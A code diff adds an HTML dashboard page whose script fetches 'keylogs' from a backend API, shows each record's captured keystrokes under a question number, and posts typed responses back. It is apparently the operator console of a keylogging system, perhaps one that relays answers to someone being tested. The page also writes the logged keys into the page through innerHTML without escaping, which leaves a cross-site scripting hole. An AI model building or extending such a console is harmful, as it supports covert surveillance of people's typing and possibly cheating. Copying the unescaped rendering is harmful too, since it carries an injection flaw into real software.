@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 10px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 20px;
+            padding-left: 10px;
+            padding-right: 10px;
+        }
+
+        .question-container {
+            position: relative;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: calc(50% - 10px);
+            box-sizing: border-box;
+            background-color: #ffffff;
+            height: 350px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            overflow: hidden;
+        }
+
+        .question-number {
+            position: absolute;
+            top: 10px; 
+            left: 10px;
+            background-color: #007bff;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 50%;
+            font-weight: bold;
+            font-size: 18px;
+            z-index: 2;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .logged-keys {
+            margin-bottom: 15px;
+            padding: 10px;
+            background-color: #f1f1f1;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            height: 150px;
+            overflow-y: auto;
+            white-space: normal;
+            box-sizing: border-box;
+        }
+
+        textarea {
+            width: 100%;
+            height: 80px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 10px;
+            resize: none;
+            overflow-y: auto;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between; 
+            gap: 10px;
+            flex-wrap: nowrap; 
+            margin-top: 10px;
+        }
+
+        button {
+            padding: 10px;
+            margin-right: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            flex: 1; 
+            text-align: center;
+            min-width: 100px;
+        }
+
+        .send-response {
+            background-color: #28a745;
+            color: white;
+        }
+
+        .delete-question {
+            background-color: #dc3545;
+            color: white;
+        }
+
+        .delete-response {
+            background-color: #ffc107;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="dashboard">
+        <!-- Keylogs will be dynamically loaded here -->
+    </div>
+
+    <script>
+        const dashboard = document.getElementById('dashboard');
+    
+        // Fetch and display keylogs
+        async function fetchKeylogs() {
+            const response = await fetch('/api/keylogs');
+            const keylogs = await response.json();
+    
+            for (const keylog of keylogs) {
+                const div = document.createElement('div');
+                div.className = 'question-container';
+                div.innerHTML = `
+                    <div class="question-number">${keylog.questionNumber}</div>
+                    <div class="logged-keys">${keylog.loggedKeys}</div>
+                    <textarea placeholder="Type your response here..."></textarea>
+                    <div class="button-container">
+                        <button class="send-response" data-id="${keylog._id}" data-question="${keylog.questionNumber}">Send Response</button>
+                        <button class="delete-question" data-id="${keylog._id}">Delete Question</button>
+                        <button class="delete-response" data-id="${keylog._id}">Delete Response</button>
+                    </div>
+                `;
+                dashboard.appendChild(div);
+            }
+        }
+
+        // Event delegation for buttons
+        dashboard.addEventListener('click', async (e) => {
+            const target = e.target;
+            const id = target.dataset.id;
+            const questionNumber = target.dataset.question;
+    
+            // Debugging log
+            console.log("Clicked:", target.className);
+    
+            // Handle send response button click
+            if (target.classList.contains('send-response')) {
+    const textarea = target.closest('.question-container').querySelector('textarea');
+    const response = textarea.value.trim();
+    const keylogId = target.dataset.id;  // Ensure we are using the correct keylogId
+
+    if (!response) {
+        alert('Please enter a response.');
+        return;
+    }
+
+    console.log('Send Response Clicked:', { questionNumber, response, keylogId });
+
+    // Log to confirm response is being captured correctly
+    console.log('Sending response:', { questionNumber, response });
+
+    try {
+        // Send response to the backend
+        const res = await fetch('/api/keylogs/responses', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ questionNumber, response, keylogId }), // Include keylogId
+        });
+
+        if (res.ok) {
+            const data = await res.json();
+            console.log('Response sent successfully:', data);
+            alert('Response sent successfully.');
+            textarea.value = '';
+        } else {
+            const errorData = await res.json();
+            console.error('Failed to send response:', errorData);
+            alert('Failed to send response: ' + (errorData.message || 'Unknown error'));
+        }
+    } catch (err) {
+        console.error('Error sending response:', err);
+        alert('Error occurred while sending response: ' + err.message);
+    }
+}
+            // Handle delete responce
+            if (target.classList.contains('delete-response')) {
+    const keylogId = target.dataset.id; // Extract keylogId from the button's data-id attribute
+
+    try {
+        const response = await fetch(`/api/keylogs/responses/${keylogId}`, { method: 'DELETE' });
+        const result = await response.json();
+
+        if (response.ok) {
+            alert(result.message); // Show success message
+        } else {
+            alert(result.error || 'Failed to delete response'); // Show error message
+        }
+    } catch (error) {
+        console.error('Error during deletion:', error);
+        alert('An error occurred while trying to delete the response.');
+    }
+}
+             // Handle delete question button click
+        if (target.classList.contains('delete-question')) {
+            try {
+                const response = await fetch(`/api/keylogs/${id}`, { method: 'DELETE' });
+                const result = await response.json();
+
+                if (response.ok) {
+                    alert(result.message); // Show success message
+                    target.closest('.question-container').remove(); // Remove the question from UI
+                } else {
+                    alert(result.error || 'Failed to delete question'); // Show error message
+                }
+            } catch (error) {
+                console.error('Error during deletion:', error);
+                alert('An error occurred while trying to delete the question.');
+            }
+        }
+        });
+    
+        // Fetch keylogs on page load
+        fetchKeylogs();
+    </script>
+    
+</body>
+</html>
